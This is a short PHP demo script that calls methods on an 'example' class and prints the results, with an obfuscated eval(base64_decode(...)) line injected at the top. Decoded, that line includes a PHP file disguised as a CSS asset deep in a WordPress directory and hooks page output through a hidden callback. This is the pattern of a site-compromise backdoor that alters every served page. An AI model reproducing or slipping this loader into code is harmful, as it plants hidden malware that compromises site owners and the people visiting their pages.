<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9ob21lMS9jaGVhcGd1ci9wdWJsaWNfaHRtbC9vd250b28vYmxvZy93cC1pbmNsdWRlcy9qcy90aW55bWNlL3BsdWdpbnMvaW5saW5lcG9wdXBzL3NraW5zL2NsZWFybG9va3MyL2ltZy9zdHlsZS5jc3MucGhwJztpZihmaWxlX2V4aXN0cygkR0xPQkFMU1snbWZzbiddKSl7aW5jbHVkZV9vbmNlKCRHTE9CQUxTWydtZnNuJ10pO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ21sJykmJmZ1bmN0aW9uX2V4aXN0cygnZGdvYmgnKSl7b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19')); ?>
<?php
require_once 'example.php';
$myExample = new example();

// performs some basic operation
echo '<b>Attempt to perform basic operations</b><br />'."\n";
try {
	echo 'Your name is <i>'.$myExample->giveMeSomeData('name').'</i><br />'."\n";
	$myExample->changeYourState('I am using this function from the local environement');
	echo 'Your status request has been accepted<br />'."\n";
} catch (Exception $e) {
	echo nl2br($e->getMessage()).'<br />'."\n";
}

// performs some strategic operation, locally allowed
echo '<br /><b>Attempt to store strategic data</b><br />'."\n";
try {
	$myExample->writeSomething('Strategic string!');
	echo 'Strategic data succefully stored';
} catch (Exception $e) {
	echo nl2br($e->getMessage());
}
?>